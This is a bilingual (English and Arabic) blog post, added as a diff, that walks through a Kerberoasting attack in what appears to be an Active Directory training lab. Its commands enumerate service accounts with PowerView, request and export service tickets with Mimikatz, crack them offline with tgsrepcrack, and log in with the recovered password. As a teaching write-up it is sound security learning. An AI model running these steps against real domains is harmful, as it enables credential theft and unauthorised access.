@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Domain Privilege Escalation - Kerberoasting Attack | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Domain Privilege Escalation - Kerberoasting Attack</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-10-20</span>
+</div>
+<h1 class="post-title">Domain Privilege Escalation - Kerberoasting Attack</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will explain the third Domain Privilege Escalation technique: Kerberoasting.</p>
+<p>Before we begin, let us understand what the Kerberoasting technique is.</p>
+<h2>What is Kerberoasting?</h2>
+<p>The idea behind this technique is that we search for domain users who have been granted permissions to execute a specific service on a specific machine (i.e., users with a Service Principal Name or SPN set). We exploit this by requesting the TGS (Ticket Granting Service) ticket associated with that user's service and then cracking it offline using a tool like tgsrepcrack. Once we recover the password, we can use those credentials to access the target machine.</p>
+<h2>Step-by-Step Walkthrough</h2>
+<h3>Step 1: Load the PowerView Module</h3>
+<p>We load the PowerView development version into memory using the following command:</p>
+<pre><code class="language-powershell">Import-Module .\PowerView_dev.ps1
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/kerberoasting/2.jpeg" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Identify Users with Service Principal Names (SPNs)</h3>
+<p>Now we search for users who have been assigned permissions to run a specific service on a specific machine. Users with SPNs set are potential Kerberoasting targets:</p>
+<pre><code class="language-powershell">Get-NetUser -SPN
+</code></pre>
+<p>We can see that the user <code>svcadmin</code> has an SPN set for the MSSQLSvc service on the machine <code>dcorp-mgmt.dollarcorp.moneycorp.local</code>. This means this user account is tied to an MSSQL service running on that host.</p>
+
+<figure class="article-img"><img src="../assets/images/kerberoasting/3.jpeg" alt="Step 2" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/kerberoasting/4.jpeg" alt="Step 3" loading="lazy"></figure>
+<h3>Step 3: Request the TGS Ticket</h3>
+<p>Now we request the TGS ticket for this user's service. We do this by using .NET's built-in Kerberos libraries to make a legitimate service ticket request:</p>
+<pre><code class="language-powershell">Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local&quot;
+</code></pre>
+<p>This sends a Kerberos service ticket request to the KDC (Key Distribution Center) for the specified SPN. The returned TGS ticket is encrypted with the service account's NTLM hash, which is why we can attempt to crack it offline.</p>
+
+<figure class="article-img"><img src="../assets/images/kerberoasting/5.jpeg" alt="Step 4" loading="lazy"></figure>
+<h3>Step 4: Export the TGS Ticket Using Mimikatz</h3>
+<p>Now we export the TGS ticket we just requested from memory to a <code>.kirbi</code> file using Mimikatz:</p>
+<pre><code>kerberos::list /export
+</code></pre>
+<p>This saves all cached Kerberos tickets, including the MSSQLSvc TGS we requested, to disk as <code>.kirbi</code> files.</p>
+
+<figure class="article-img"><img src="../assets/images/kerberoasting/6.jpeg" alt="Step 5" loading="lazy"></figure>
+<h3>Step 5: Crack the TGS Ticket Offline</h3>
+<p>Now we crack the exported TGS ticket offline using the tgsrepcrack tool with a password wordlist:</p>
+<pre><code class="language-bash">python .\tgsrepcrack.py .\10k-worst-pass.txt .\tgs.kirbi
+</code></pre>
+<p>The tool attempts to decrypt the TGS ticket using each password in the wordlist. If the service account has a weak password, the tool will successfully crack it and reveal the plaintext password.</p>
+
+<figure class="article-img"><img src="../assets/images/kerberoasting/7.jpeg" alt="Step 6" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/kerberoasting/8.jpeg" alt="Step 7" loading="lazy"></figure>
+<h3>Step 6: Authenticate and Access the Target System</h3>
+<p>Now that we have recovered the password, we open a new PowerShell session using the <code>svcadmin</code> credentials. The password recovered in this case is <code>ThisisBlasphemyThisisMadness!!</code>.</p>
+<p>We then attempt to access the target machine <code>dcorp-mgmt</code> to verify whether our compromised credentials grant us access.</p>
+<p>We successfully gain access to the <code>dcorp-mgmt</code> machine using the <code>svcadmin</code> account, because this account has the MSSQLSvc service delegation on <code>dcorp-mgmt</code>, which grants the necessary access to the host.</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/9.jpeg" alt="Step 8" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>Domain Privilege Escalation - Kerberoasting Attack</p>
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح التكينك الثالث لي الـDomain Privilege وهو الـKerberoasting</p>
+<p>قبل نبدا شرح التكنيك خلونا نعرف ايش هو تكنيك Kerberoasting؟</p>
+<p>الفكرة من هذا التكنيك انه نبحث عن مستخدمين لديهم صلاحية لتنفيذ خدمة معينه في جهاز معين ف انا راح استغل الخدمة هذي عشان احصل على الـTGS الخاصة في المستخدم ونسوي لها Crack عن طريق اداة tgscrack بعد كذا ندخل للجهاز</p>
+<p>الشرح:</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/2.jpeg" alt="Step 1" loading="lazy"></figure>
+
+<p>راح نسوي Load في الميموري لـ اداة PowerView عن طريق هذا الامر:</p>
+<p>Import-Module .\PowerView_dev.ps1</p>
+<p>الان راح نبحث عن مستخدمين لديهم صلاحية لتنفيذ خدمة معينه في جهاز معين عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/3.jpeg" alt="Step 2" loading="lazy"></figure>
+
+<p>Get-NetUser -SPN</p>
+<p>نلاحظ انه المستخدم svcadmin لديه صلاحية على خدمة MSSQLsvc في جهاز dcrop-mgmt.dollarcorp.moneycorp.local</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/4.jpeg" alt="Step 3" loading="lazy"></figure>
+
+<p>الان راح نسوي طلب لي الـTGS الخاصه في هذا المستخدم عن طريق هذي الامرين</p>
+<p>Add-Type -AssemblyNAme System.IdentityModel</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/5.jpeg" alt="Step 4" loading="lazy"></figure>
+
+<p>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</p>
+<p>الان راح نسوي Export لي الـTGS الخاص بـMSSQLSvc عن طريق اداة Mimikatz</p>
+<p>الامر:</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/6.jpeg" alt="Step 5" loading="lazy"></figure>
+
+<p>kerberos::list /export</p>
+<p>الان راح نكرك الـTGS عن طريق اداة tgscrack عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/7.jpeg" alt="Step 6" loading="lazy"></figure>
+
+<p>python .\tgsrepcrack.py .\10k-worst-pass.txt .\tgs.kirbi</p>
+<p>الان راح نفتح جلسة Powershell جديدة بالمستخدم svcadmin والباسورد الخاص فيه اللي هو ThisisBlasphemyThisisMadness!!</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/8.jpeg" alt="Step 7" loading="lazy"></figure>
+
+<p>الان راح اجرب ادخل لجهاز dcrop-mgmt ونشوف هل يدخلنا او لا</p>
+<p>قدرنا ندخل لجهاز dcrop-mgmt عن طريق المستخدم svcadmin لانه يمكنه تنفيذ خدمة MSSQLSvc في جهاز dcrop-mgmt</p>
+<p>وصلنا الى نهاية المقالة</p>
+<figure class="article-img"><img src="../assets/images/kerberoasting/9.jpeg" alt="Step 8" loading="lazy"></figure>
+
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
